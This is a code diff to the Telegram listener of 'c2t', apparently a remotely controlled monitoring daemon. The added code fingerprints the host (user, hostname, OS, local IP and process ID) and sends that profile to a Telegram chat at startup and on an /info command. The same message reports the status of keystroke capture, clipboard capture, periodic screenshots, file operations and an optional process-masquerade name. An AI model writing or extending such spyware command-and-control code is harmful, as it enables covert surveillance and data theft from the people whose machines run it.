@@ -16,8 +16,10 @@
  */
 
 #include "telegram_listener.h"
+#include "c2t_version.h"
 #include "../clipboard/clipboard_output.h"
 #include "../config/config.h"
+#include "../crypto/crypto.h"
 #include "../files/files.h"
 #include "../keyboard/keyboard.h"
 #include "../keyboard/keyboard_output.h"
@@ -37,11 +39,20 @@
 #include <string.h>
 
 #ifndef _WIN32
+#include <arpa/inet.h>
+#include <ifaddrs.h>
+#include <net/if.h>
+#include <netdb.h>
 #include <pthread.h>
+#include <pwd.h>
+#include <sys/utsname.h>
 #include <unistd.h>
 #else
 #define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
+#include <iphlpapi.h>
 #include "../win32/win32_api.h"
 
 static HANDLE c2t_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,
@@ -144,6 +155,7 @@ typedef enum {
   CMD_SCREENSHOT_STATUS,
   CMD_SCREENSHOT_HELP,
   CMD_STATUS,
+  CMD_INFO,
   CMD_KILL,
   CMD_HELP
 } c2t_cmd_id_t;
@@ -195,8 +207,9 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"screenshot_status", CMD_SCREENSHOT_STATUS},
   {"screenshot_help", CMD_SCREENSHOT_HELP},
   {"status", CMD_STATUS}, {"ping", CMD_STATUS},
+  {"info", CMD_INFO}, {"sysinfo", CMD_INFO}, {"about", CMD_INFO}, {"start", CMD_INFO},
   {"kill", CMD_KILL}, {"stop", CMD_KILL}, {"shutdown", CMD_KILL}, {"terminate", CMD_KILL}, {"quit", CMD_KILL}, {"exit", CMD_KILL},
-  {"help", CMD_HELP}, {"start", CMD_HELP}
+  {"help", CMD_HELP}
 };
 
 static cmd_entry_t s_cmd_table[CMD_TABLE_SIZE];
@@ -312,6 +325,387 @@ static void format_metric_bytes(uint64_t b, char *out, size_t cap) {
     snprintf(out, cap, "%.2f GB (%llu bytes)",
              (double)b / (1024.0 * 1024.0 * 1024.0), (unsigned long long)b);
   }
+}
+
+static void escape_html_str(const char *src, char *dst, size_t dst_size) {
+  if (!src || !dst || dst_size == 0) {
+    if (dst && dst_size > 0)
+      dst[0] = '\0';
+    return;
+  }
+  size_t d = 0;
+  for (size_t s = 0; src[s] != '\0' && d + 6 < dst_size; ++s) {
+    if (src[s] == '&') {
+      memcpy(dst + d, "&amp;", 5);
+      d += 5;
+    } else if (src[s] == '<') {
+      memcpy(dst + d, "&lt;", 4);
+      d += 4;
+    } else if (src[s] == '>') {
+      memcpy(dst + d, "&gt;", 4);
+      d += 4;
+    } else if (src[s] == '"') {
+      memcpy(dst + d, "&quot;", 6);
+      d += 6;
+    } else {
+      dst[d++] = src[s];
+    }
+  }
+  dst[d] = '\0';
+}
+
+static void get_system_user_and_host(char *user_out, size_t user_cap,
+                                     char *host_out, size_t host_cap) {
+  if (user_out && user_cap > 0)
+    snprintf(user_out, user_cap, "unknown");
+  if (host_out && host_cap > 0)
+    snprintf(host_out, host_cap, "localhost");
+
+#ifndef _WIN32
+  const char *u = getenv("USER");
+  if (!u || !*u)
+    u = getenv("LOGNAME");
+  if (!u || !*u) {
+    struct passwd *pw = getpwuid(geteuid());
+    if (pw && pw->pw_name)
+      u = pw->pw_name;
+  }
+  if (u && *u && user_out && user_cap > 0) {
+    snprintf(user_out, user_cap, "%s", u);
+  }
+
+  char h[256] = "";
+  if (gethostname(h, sizeof(h)) == 0 && h[0] != '\0') {
+    if (host_out && host_cap > 0)
+      snprintf(host_out, host_cap, "%s", h);
+  } else {
+    const char *env_h = getenv("HOSTNAME");
+    if (env_h && *env_h && host_out && host_cap > 0) {
+      snprintf(host_out, host_cap, "%s", env_h);
+    }
+  }
+#else
+  const char *env_u = getenv("USERNAME");
+  if (!env_u || !*env_u)
+    env_u = getenv("USER");
+  if (env_u && *env_u && user_out && user_cap > 0) {
+    snprintf(user_out, user_cap, "%s", env_u);
+  }
+
+  char h[256] = "";
+  DWORD h_len = sizeof(h);
+  if (GetComputerNameA(h, &h_len) && h[0] != '\0') {
+    if (host_out && host_cap > 0)
+      snprintf(host_out, host_cap, "%s", h);
+  } else {
+    const char *env_h = getenv("COMPUTERNAME");
+    if (env_h && *env_h && host_out && host_cap > 0) {
+      snprintf(host_out, host_cap, "%s", env_h);
+    }
+  }
+#endif
+}
+
+static void get_system_os_info(char *os_out, size_t os_cap) {
+  if (!os_out || os_cap == 0)
+    return;
+  snprintf(os_out, os_cap, "Unknown OS");
+
+#ifndef _WIN32
+  struct utsname uts;
+  if (uname(&uts) == 0) {
+#if defined(__APPLE__)
+    snprintf(os_out, os_cap, "macOS (%s %s)", uts.release, uts.machine);
+#elif defined(__linux__)
+    char distro[128] = "";
+    FILE *f = fopen("/etc/os-release", "r");
+    if (f) {
+      char line[256];
+      while (fgets(line, sizeof(line), f)) {
+        if (strncmp(line, "PRETTY_NAME=", 12) == 0) {
+          char *val = line + 12;
+          if (*val == '"' || *val == '\'') {
+            val++;
+            char *end = strchr(val, '"');
+            if (!end)
+              end = strchr(val, '\'');
+            if (end)
+              *end = '\0';
+          } else {
+            char *end = strpbrk(val, "\r\n");
+            if (end)
+              *end = '\0';
+          }
+          snprintf(distro, sizeof(distro), "%s", val);
+          break;
+        }
+      }
+      fclose(f);
+    }
+    if (distro[0] != '\0') {
+      snprintf(os_out, os_cap, "%s (%s %s)", distro, uts.release,
+               uts.machine);
+    } else {
+      snprintf(os_out, os_cap, "%s %s (%s)", uts.sysname, uts.release,
+               uts.machine);
+    }
+#else
+    snprintf(os_out, os_cap, "%s %s (%s)", uts.sysname, uts.release,
+             uts.machine);
+#endif
+  }
+#else
+  OSVERSIONINFOEXW osvi;
+  memset(&osvi, 0, sizeof(osvi));
+  osvi.dwOSVersionInfoSize = sizeof(osvi);
+
+  SYSTEM_INFO si;
+  GetNativeSystemInfo(&si);
+  const char *arch = "x86";
+  if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
+    arch = "x64";
+  else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64)
+    arch = "ARM64";
+  else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM)
+    arch = "ARM";
+
+  typedef LONG(WINAPI *pfn_RtlGetVersion)(POSVERSIONINFOEXW);
+  HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+  if (hNtdll) {
+    FARPROC proc = GetProcAddress(hNtdll, "RtlGetVersion");
+    if (proc) {
+#if defined(__GNUC__) || defined(__clang__)
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wcast-function-type"
+#endif
+      pfn_RtlGetVersion pRtlGetVersion = (pfn_RtlGetVersion)proc;
+#if defined(__GNUC__) || defined(__clang__)
+#pragma GCC diagnostic pop
+#endif
+      if (pRtlGetVersion(&osvi) == 0) {
+        const char *win_name = "Windows";
+        if (osvi.dwMajorVersion == 10 && osvi.dwBuildNumber >= 22000)
+          win_name = "Windows 11";
+        else if (osvi.dwMajorVersion == 10)
+          win_name = "Windows 10";
+        else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 3)
+          win_name = "Windows 8.1";
+        else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2)
+          win_name = "Windows 8";
+        else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1)
+          win_name = "Windows 7";
+
+        snprintf(os_out, os_cap, "%s (Build %lu, %s)", win_name,
+                 (unsigned long)osvi.dwBuildNumber, arch);
+        return;
+      }
+    }
+  }
+  snprintf(os_out, os_cap, "Windows (%s)", arch);
+#endif
+}
+
+static void get_system_ip_info(char *ip_out, size_t ip_cap) {
+  if (!ip_out || ip_cap == 0)
+    return;
+  snprintf(ip_out, ip_cap, "unknown");
+
+#ifndef _WIN32
+  struct ifaddrs *ifaddr = NULL;
+  if (getifaddrs(&ifaddr) == 0) {
+    for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+      if (!ifa->ifa_addr || (ifa->ifa_flags & IFF_LOOPBACK) ||
+          !(ifa->ifa_flags & IFF_UP))
+        continue;
+      if (ifa->ifa_addr->sa_family == AF_INET) {
+        char host[NI_MAXHOST] = "";
+        if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host,
+                        sizeof(host), NULL, 0, NI_NUMERICHOST) == 0 &&
+            host[0] != '\0') {
+          snprintf(ip_out, ip_cap, "%s (%s)", host, ifa->ifa_name);
+          break;
+        }
+      }
+    }
+    freeifaddrs(ifaddr);
+  }
+#else
+  c2t_win32_api_init();
+  if (g_c2t_win32.GetAdaptersAddresses) {
+    ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST |
+                  GAA_FLAG_SKIP_DNS_SERVER;
+    ULONG out_buf_len = 15360;
+    PIP_ADAPTER_ADDRESSES addresses = (IP_ADAPTER_ADDRESSES *)malloc(out_buf_len);
+    if (addresses) {
+      ULONG ret = g_c2t_win32.GetAdaptersAddresses(AF_INET, flags, NULL,
+                                                   addresses, &out_buf_len);
+      if (ret == ERROR_BUFFER_OVERFLOW) {
+        free(addresses);
+        addresses = (IP_ADAPTER_ADDRESSES *)malloc(out_buf_len);
+        if (addresses) {
+          ret = g_c2t_win32.GetAdaptersAddresses(AF_INET, flags, NULL,
+                                                addresses, &out_buf_len);
+        }
+      }
+      if (ret == NO_ERROR && addresses) {
+        for (PIP_ADAPTER_ADDRESSES curr = addresses; curr != NULL;
+             curr = curr->Next) {
+          if (curr->IfType == IF_TYPE_SOFTWARE_LOOPBACK ||
+              curr->OperStatus != IfOperStatusUp)
+            continue;
+          if (curr->FirstUnicastAddress &&
+              curr->FirstUnicastAddress->Address.lpSockaddr) {
+            struct sockaddr_in *sa =
+                (struct sockaddr_in *)(void *)
+                    curr->FirstUnicastAddress->Address.lpSockaddr;
+            const unsigned char *b = (const unsigned char *)&sa->sin_addr;
+            char friendly[64] = "";
+            WideCharToMultiByte(CP_UTF8, 0, curr->FriendlyName, -1, friendly,
+                                sizeof(friendly), NULL, NULL);
+            snprintf(ip_out, ip_cap, "%u.%u.%u.%u (%s)", b[0], b[1], b[2], b[3],
+                     friendly[0] ? friendly : "Ethernet");
+            break;
+          }
+        }
+      }
+      if (addresses)
+        free(addresses);
+    }
+  }
+#endif
+}
+
+int telegram_send_start_info(void) {
+  const c2t_config_t *config = c2t_config_get();
+  if (!config || !config->telegram_bot_token || !config->telegram_chat_id ||
+      !*config->telegram_bot_token || !*config->telegram_chat_id) {
+    return 0;
+  }
+
+  char raw_user[128] = {}, raw_host[128] = {}, raw_os[256] = {},
+       raw_ip[128] = {};
+  get_system_user_and_host(raw_user, sizeof(raw_user), raw_host,
+                           sizeof(raw_host));
+  get_system_os_info(raw_os, sizeof(raw_os));
+  get_system_ip_info(raw_ip, sizeof(raw_ip));
+
+  char user[256] = {}, host[256] = {}, os_str[512] = {}, ip_str[256] = {};
+  escape_html_str(raw_user, user, sizeof(user));
+  escape_html_str(raw_host, host, sizeof(host));
+  escape_html_str(raw_os, os_str, sizeof(os_str));
+  escape_html_str(raw_ip, ip_str, sizeof(ip_str));
+
+  const char *daemon_name =
+#ifdef C2T_ENABLE_PROCESS_MASQUERADE
+      config->daemon_name && *config->daemon_name ? config->daemon_name : "c2t";
+#else
+      "c2t";
+#endif
+  char proc_name[128] = {};
+  escape_html_str(daemon_name, proc_name, sizeof(proc_name));
+
+  unsigned long pid = 0;
+#ifndef _WIN32
+  pid = (unsigned long)getpid();
+#else
+  pid = (unsigned long)GetCurrentProcessId();
+#endif
+
+  const char *role_str = "🟢 Standalone Daemon";
+  if (config->is_worker) {
+    role_str = "🔄 Worker (Supervisor Active)";
+  } else if (config->auto_restart) {
+    role_str = "🛡️ Supervisor Managed";
+  }
+
+  /* Subsystems */
+  char clip_detail[128] = {};
+  if (config->disable_clipboard) {
+    snprintf(clip_detail, sizeof(clip_detail), "❌ <b>DISABLED</b>");
+  } else {
+    snprintf(clip_detail, sizeof(clip_detail),
+             "🟢 <b>ACTIVE</b> (Window info: %s)",
+             config->telegram_send_window_info ? "Yes" : "No");
+  }
+
+  char kb_detail[256] = {};
+  if (config->disable_keyboard) {
+    snprintf(kb_detail, sizeof(kb_detail), "❌ <b>DISABLED</b>");
+  } else {
+    char kb_target[64] = "all", kb_layout[32] = "it";
+    keyboard_get_selected_target(kb_target, sizeof(kb_target));
+    keyboard_get_layout(kb_layout, sizeof(kb_layout));
+    char esc_target[128] = {}, esc_layout[64] = {};
+    escape_html_str(kb_target, esc_target, sizeof(esc_target));
+    escape_html_str(kb_layout, esc_layout, sizeof(esc_layout));
+    int kb_mode = keyboard_get_format_mode();
+    snprintf(
+        kb_detail, sizeof(kb_detail),
+        "🟢 <b>ACTIVE</b> (Target: <code>%s</code>, Layout: <code>%s</code>, "
+        "Mode: %s)",
+        esc_target, esc_layout,
+        kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text");
+  }
+
+  char shot_detail[256] = {};
+  if (config->disable_screenshot) {
+    snprintf(shot_detail, sizeof(shot_detail), "❌ <b>DISABLED</b>");
+  } else {
+    const char *be_name = screenshot_get_backend_name();
+    char esc_be[64] = {};
+    escape_html_str(be_name ? be_name : "native", esc_be, sizeof(esc_be));
+    size_t interval = screenshot_get_interval();
+    if (interval > 0) {
+      snprintf(shot_detail, sizeof(shot_detail),
+               "🟢 <b>PERIODIC</b> (%llu s, Backend: %s, Q%d)",
+               (unsigned long long)interval, esc_be, screenshot_get_quality());
+    } else {
+      snprintf(shot_detail, sizeof(shot_detail),
+               "🟢 <b>ON-DEMAND</b> (Backend: %s, Q%d)", esc_be,
+               screenshot_get_quality());
+    }
+  }
+
+  const char *crypto_engine = c2t_crypto_chacha20_backend();
+  char esc_crypto[128] = {};
+  escape_html_str(crypto_engine ? crypto_engine : "ChaCha20", esc_crypto,
+                  sizeof(esc_crypto));
+
+  char proxy_str[256] = "Direct";
+  if (config->proxy && *config->proxy) {
+    escape_html_str(config->proxy, proxy_str, sizeof(proxy_str));
+  }
+
+  char msg[3800];
+  snprintf(
+      msg, sizeof(msg),
+      "🚀 <b>c2t Daemon Online</b>\n\n"
+      "💻 <b>Host System:</b>\n"
+      "• <b>User &amp; Host:</b> <code>%s@%s</code>\n"
+      "• <b>OS &amp; Kernel:</b> %s\n"
+      "• <b>Local IP:</b> <code>%s</code>\n"
+      "• <b>Process:</b> <code>%s</code> (PID: <code>%lu</code>)\n"
+      "• <b>Version:</b> <code>v%s</code>\n"
+      "• <b>Role:</b> %s\n\n"
+      "⚙️ <b>Active Subsystems:</b>\n"
+      "• 📋 <b>Clipboard:</b> %s\n"
+      "• ⌨️ <b>Keyboard:</b> %s\n"
+      "• 📸 <b>Screenshots:</b> %s\n"
+      "• 📜 <b>Log Sender:</b> %s\n"
+      "• 📁 <b>File Operations:</b> %s\n"
+      "• 🔒 <b>Crypto:</b> <code>%s</code>\n"
+      "• 🌐 <b>Proxy:</b> <code>%s</code>\n\n"
+      "💡 <i>Use <code>/help</code> for available commands or <code>/status</code> for live stats.</i>",
+      user, host, os_str, ip_str, proc_name, pid, C2T_VERSION, role_str,
+      clip_detail, kb_detail, shot_detail,
+      config->telegram_send_logs ? "🟢 Periodic" : "⚪ On-demand (/logs)",
+      config->telegram_send_files ? "🟢 Enabled" : "❌ Disabled", esc_crypto,
+      proxy_str);
+
+  int ret = telegram_send_html(msg);
+  c2t_log_info("telegram", "Startup notification delivery %s",
+               ret ? "succeeded" : "failed");
+  return ret;
 }
 
 static void handle_command(const telegram_incoming_update_t *update,
@@ -1299,6 +1693,11 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_INFO: {
+    (void)telegram_send_start_info();
+    break;
+  }
+
   case CMD_KILL: {
     c2t_log_warning(
         "listener",
@@ -1326,11 +1725,12 @@ static void handle_command(const telegram_incoming_update_t *update,
     static const char help_head[] =
         "💡 <b>c2t Telegram Commands</b>\n\n"
         "<b>Core Controls:</b>\n"
+        "• <code>/info</code> (or <code>/start</code>) - View host info &amp; startup summary\n"
+        "• <code>/status</code> - View daemon status &amp; throughput state\n"
+        "• <code>/logs</code> - Flush and retrieve execution logs\n"
         "• <code>/pause</code> - Pause all active monitoring\n"
         "• <code>/resume</code> - Resume all active monitoring\n"
         "• <code>/toggle</code> - Toggle pause / resume\n"
-        "• <code>/logs</code> - Flush and retrieve execution logs\n"
-        "• <code>/status</code> - View daemon status &amp; monitoring state\n"
         "• <code>/kill</code> - Completely stop and terminate the process\n\n";
     memcpy(help_msg, help_head, sizeof(help_head) - 1);
     h_off = sizeof(help_head) - 1;
